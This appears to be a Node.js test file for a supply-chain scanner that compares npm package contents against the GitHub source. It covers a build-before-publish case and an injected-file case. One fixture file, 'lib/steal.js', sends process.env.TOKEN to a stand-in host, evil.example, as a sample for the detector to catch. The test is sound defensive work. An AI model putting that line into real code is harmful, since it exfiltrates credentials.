"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");
const { diffNpmVsGithub } = require("../src/diff");

async function writeTree(root, files) {
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(root, rel);
    await fs.mkdir(path.dirname(full), { recursive: true });
    await fs.writeFile(full, content);
  }
}

async function stageDirs(npmFiles, ghFiles) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "sca-diff-"));
  const npm = path.join(root, "npm");
  const gh = path.join(root, "gh");
  await fs.mkdir(npm);
  await fs.mkdir(gh);
  await writeTree(npm, npmFiles);
  await writeTree(gh, ghFiles);
  return { root, npm, gh };
}

// Regression: a built-before-publish package (react's shape — flattened cjs/umd
// build + tiny root re-export shims) overlaps the repo by almost nothing, so the
// diff must NOT fire HIGH on it. It should skip as "tree-built-before-publish".
test("built-before-publish package is not flagged as divergence", async () => {
  const { npm, gh } = await stageDirs(
    {
      // tiny root re-export shims that point at the build (differ from repo src)
      "index.js": "module.exports = require('./cjs/react.production.min.js');\n",
      "jsx-runtime.js": "module.exports = require('./cjs/react-jsx-runtime.production.min.js');\n",
      "jsx-dev-runtime.js": "module.exports = require('./cjs/react-jsx-dev-runtime.development.js');\n",
      "react.shared-subset.js": "module.exports = require('./cjs/react.shared-subset.production.min.js');\n",
      // flattened build output not present in the repo tree
      "cjs/react.development.js": "/* built */ 'use strict';\n",
      "cjs/react.shared-subset.development.js": "/* built */ 'use strict';\n",
      "cjs/react-jsx-runtime.development.js": "/* built */ 'use strict';\n",
      "cjs/react-jsx-dev-runtime.development.js": "/* built */ 'use strict';\n",
      "umd/react.development.js": "/* built umd */\n",
      "package.json": '{"name":"react","version":"18.3.1"}\n'
    },
    {
      // repo keeps real source under src/, only package.json matches by path
      "package.json": '{"name":"react","version":"18.3.1"}\n',
      "index.js": "'use strict';\nmodule.exports = require('./src/React');\n",
      "src/React.js": "// real react source\n",
      "src/jsx/ReactJSX.js": "// real jsx source\n"
    }
  );

  const diff = await diffNpmVsGithub({ npmStagedPath: npm, githubStagedPath: gh });
  assert.equal(diff.compared, false, "built package should not be diffed");
  assert.equal(diff.reason, "tree-built-before-publish");
});

// Guard against over-correction: a normal package whose tree mirrors the repo,
// with one genuinely injected extra source file, must STILL fire divergence.
// Here matched > 1, so the build-before-publish skip does not apply.
test("injected extra source file in a mirrored tree still flags divergence", async () => {
  const shared = {
    "package.json": '{"name":"clean-pkg","version":"1.0.0"}\n',
    "index.js": "module.exports = 1;\n",
    "lib/a.js": "module.exports = 'a';\n",
    "lib/b.js": "module.exports = 'b';\n"
  };
  const { npm, gh } = await stageDirs(
    {
      ...shared,
      // attacker-dropped file inside a dir github has, not present upstream
      "lib/steal.js": "fetch('http://evil.example/' + process.env.TOKEN);\n"
    },
    shared
  );

  const diff = await diffNpmVsGithub({ npmStagedPath: npm, githubStagedPath: gh });
  assert.equal(diff.compared, true, "mirrored tree should be compared");
  assert.ok(diff.counts.matched > 1, "should have a real matching baseline");
  assert.ok(
    (diff.counts.extraSource || 0) >= 1,
    "the injected source file must be reported as an extra-source divergence"
  );
});
